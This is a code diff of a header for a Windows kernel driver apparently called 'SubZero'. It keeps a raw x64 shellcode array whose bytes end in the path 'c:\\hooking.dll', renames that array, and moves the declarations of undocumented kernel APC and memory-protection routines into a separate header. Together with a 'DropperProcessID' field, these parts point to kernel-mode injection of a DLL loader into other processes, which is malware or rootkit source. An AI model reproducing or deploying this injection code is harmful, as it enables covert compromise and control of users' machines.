@@ -1,12 +1,12 @@
 #pragma once
 #include "pch.h"
 #include "SubZeroCommon.h"
+#include "UndocumentedImports.h"
 
 #define DRIVER_PREFIX "SubZero: "
 #define DRIVER_TAG 'subz'
 
-
-unsigned char injected_shellcode[] = "\x48\x89\xe0\x48\x81\xe4\x00\xff\xff\xff\x48\x83\xc4\x08\x50\xe8"
+unsigned char Shellcode[] = "\x48\x89\xe0\x48\x81\xe4\x00\xff\xff\xff\x48\x83\xc4\x08\x50\xe8"
 "\x00\x00\x00\x00\x41\x5f\xb9\x55\x95\xdb\x6d\xe8\x5b\x00\x00\x00"
 "\x49\x89\xc4\x48\x83\xf8\x00\x0f\x84\x1b\x01\x00\x00\xb9\xfb\xf0"
 "\xbf\x5f\x4c\x89\xe2\xe8\x80\x00\x00\x00\x48\x83\xf8\x00\x0f\x84"
@@ -27,90 +27,6 @@ unsigned char injected_shellcode[] = "\x48\x89\xe0\x48\x81\xe4\x00\xff\xff\xff\x
 "\x0f\xb7\x44\x7d\x00\x41\x8b\x04\x83\x48\x01\xd8\x5b\x41\x5f\x41"
 "\x5e\x41\x5d\x41\x5c\x41\x5b\xc3\x63\x3a\x5c\x5c\x68\x6f\x6f\x6b"
 "\x69\x6e\x67\x2e\x64\x6c\x6c\x00\x5c\xc3";
-
-
-
-
-typedef enum _KAPC_ENVIRONMENT {
-	OriginalApcEnvironment,
-	AttachedApcEnvironment,
-	CurrentApcEnvironment,
-	InsertApcEnvironment
-} KAPC_ENVIRONMENT;
-
-typedef
-VOID
-(*PKNORMAL_ROUTINE) (
-	IN PVOID NormalContext,
-	IN PVOID SystemArgument1,
-	IN PVOID SystemArgument2
-	);
-
-typedef
-VOID
-(*PKKERNEL_ROUTINE) (
-	IN PKAPC Apc,
-	IN OUT PKNORMAL_ROUTINE* NormalRoutine,
-	IN OUT PVOID* NormalContext,
-	IN OUT PVOID* SystemArgument1,
-	IN OUT PVOID* SystemArgument2
-	);
-
-typedef
-VOID
-(*PKRUNDOWN_ROUTINE) (
-	IN  PKAPC Apc
-	);
-
-extern "C"
-VOID
-KeInitializeApc(
-	IN  PKAPC Apc,
-	IN  PKTHREAD Thread,
-	IN  KAPC_ENVIRONMENT Environment,
-	IN  PKKERNEL_ROUTINE KernelRoutine,
-	IN  PKRUNDOWN_ROUTINE RundownRoutine OPTIONAL,
-	IN  PKNORMAL_ROUTINE NormalRoutine OPTIONAL,
-	IN  KPROCESSOR_MODE ApcMode OPTIONAL,
-	IN  PVOID NormalContext OPTIONAL
-);
-
-extern "C"
-BOOLEAN
-KeInsertQueueApc(
-	IN  PKAPC Apc,
-	IN  PVOID SystemArgument1,
-	IN  PVOID SystemArgument2,
-	IN  KPRIORITY Increment
-);
-
-extern "C"
-NTSYSAPI
-NTSTATUS
-NTAPI
-ZwProtectVirtualMemory(
-	IN HANDLE ProcessHandle,
-	IN OUT PVOID * BaseAddress,
-	IN OUT PULONG NumberOfBytesToProtect,
-	IN ULONG NewAccessProtection,
-	OUT PULONG OldAccessProtection
-);
-
-extern "C"
-NTKERNELAPI
-PVOID
-NTAPI
-PsGetProcessWow64Process(
-	_In_ PEPROCESS Process
-);
-
-extern "C"
-NTKERNELAPI
-BOOLEAN
-NTAPI
-PsIsProtectedProcess(
-	_In_ PEPROCESS Process
-);
 
 struct Globals {
 	ULONG DropperProcessID = 0;
